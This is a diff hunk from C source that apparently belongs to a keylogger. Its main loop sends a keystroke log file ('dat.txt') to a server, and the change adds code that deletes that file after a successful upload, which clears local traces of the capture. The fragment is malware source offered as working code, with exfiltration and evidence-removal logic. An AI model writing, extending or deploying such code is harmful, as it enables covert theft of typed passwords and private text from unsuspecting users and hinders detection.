@@ -80,8 +80,14 @@ int main()
 			start = end;
 			if (send_to_server("dat.txt") != 0)
 				printf("[-] Fail sending keylog data\n\n");
-			else
-				printf("[+] Success sending keylog data\n\n");
+			else {
+				printf("[+] Success sending keylog data\n");
+				printf("[*] Delete keylogfile\n");
+				if (remove("dat.txt") == 0)
+					printf("[+] Success delete keylog data\n\n");
+				else
+					printf("[-] Fail delete keylog data\n\n");
+			}
 		}
 	}
 	return 0;
